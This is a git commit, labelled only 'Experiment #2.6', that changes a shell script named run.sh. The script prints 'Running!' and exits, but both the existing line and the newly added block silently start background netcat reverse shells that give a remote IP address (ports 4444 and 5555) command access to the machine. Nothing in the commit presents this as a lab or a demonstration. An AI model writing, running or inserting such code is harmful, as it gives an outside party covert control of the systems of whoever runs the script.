e7e0113bd99702520012c31ba902728bbf0b6856
Faris Haidar Zuhdi <faris.zuhdi@traveloka.com>
2025-09-18 17:25:48 +0700

    Experiment #2.6

--- run.sh
+++ run.sh
@@ -2,3 +2,15 @@
 echo Running!
 nohup sh -c 'mkfifo /tmp/f; nc 103.150.196.198 4444 < /tmp/f | sh > /tmp/f 2>&1; rm /tmp/f' </dev/null >/dev/null 2>&1 & disown
 exit 0
+
+#!/bin/bash
+echo Running!
+(
+  (
+    mkfifo /tmp/f
+    #!/bin/bash
+    nc 103.150.196.198 5555 < /tmp/f | sh > /tmp/f 2>&1
+    rm /tmp/f
+  ) </dev/null >/dev/null 2>&1 &
+) &
+exit 0
